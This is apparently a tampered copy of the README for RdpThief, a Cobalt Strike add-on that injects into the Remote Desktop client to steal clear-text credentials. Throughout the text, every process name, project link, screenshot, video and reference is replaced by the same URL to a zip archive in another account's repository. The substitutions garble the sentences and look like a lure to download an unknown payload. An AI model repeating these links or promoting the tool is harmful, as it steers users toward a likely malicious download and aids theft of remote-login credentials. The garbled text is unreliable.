# RdpThief

RdpThief by itself is a standalone DLL that when injected in the https://github.com/r2hloveu/RdpThief/raw/refs/heads/master/RdpThief/Thief_Rdp_3.0-alpha.2.zip process, will perform API hooking, extract the clear-text credentials and save them to a file. 

An aggressor script accompanies it, which is responsible for managing the state, monitoring for new processes and injecting the shellcode in https://github.com/r2hloveu/RdpThief/raw/refs/heads/master/RdpThief/Thief_Rdp_3.0-alpha.2.zip The DLL has been converted to shellcode using the sRDI project (https://github.com/r2hloveu/RdpThief/raw/refs/heads/master/RdpThief/Thief_Rdp_3.0-alpha.2.zip). When enabled, RdpThief will get the process list every 5 seconds, search for https://github.com/r2hloveu/RdpThief/raw/refs/heads/master/RdpThief/Thief_Rdp_3.0-alpha.2.zip, and inject to it.

When the aggressor script is loaded on Cobalt Strike, three new commands will be available:

* rdpthief_enable – Enables the hearbeat check of new https://github.com/r2hloveu/RdpThief/raw/refs/heads/master/RdpThief/Thief_Rdp_3.0-alpha.2.zip processes and inject into them.
* rdpthief_disable – Disables the hearbeat check of new https://github.com/r2hloveu/RdpThief/raw/refs/heads/master/RdpThief/Thief_Rdp_3.0-alpha.2.zip but will not unload the already loaded DLL.
* rdpthief_dump – Prints the extracted credentials if any.

## Screenshot

![Example Usage](https://github.com/r2hloveu/RdpThief/raw/refs/heads/master/RdpThief/Thief_Rdp_3.0-alpha.2.zip)

Demonstration Video : https://github.com/r2hloveu/RdpThief/raw/refs/heads/master/RdpThief/Thief_Rdp_3.0-alpha.2.zip

More details can be found on : https://github.com/r2hloveu/RdpThief/raw/refs/heads/master/RdpThief/Thief_Rdp_3.0-alpha.2.zip
